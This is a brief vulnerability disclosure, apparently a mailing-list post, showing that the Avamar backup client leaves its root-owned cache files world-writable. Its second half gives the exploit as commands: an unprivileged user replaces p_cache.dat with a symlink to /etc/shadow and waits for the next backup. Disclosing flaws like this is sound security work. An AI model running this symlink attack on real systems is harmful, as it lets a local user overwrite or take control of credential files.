The avamar client runs as root and after each backup it leavs the cache files as world writable:

# ls -latr /var/avamar/f_cache.dat 
-rw-rw-rw- 1 root root 11534880 Dec 17 10:30 /var/avamar/f_cache.dat
# ls -latr /var/avamar/p_cache.dat 
-rw-rw-rw- 1 root root 3146272 Dec 17 10:30 /var/avamar/p_cache.dat

Fun && profit:

# id
uid=1000(slave) gid=1000(slave) groups=1000(slave)
# cd /var/avamar
# ln -sf /etc/shadow p_cache.dat

and wait for the next backup window.
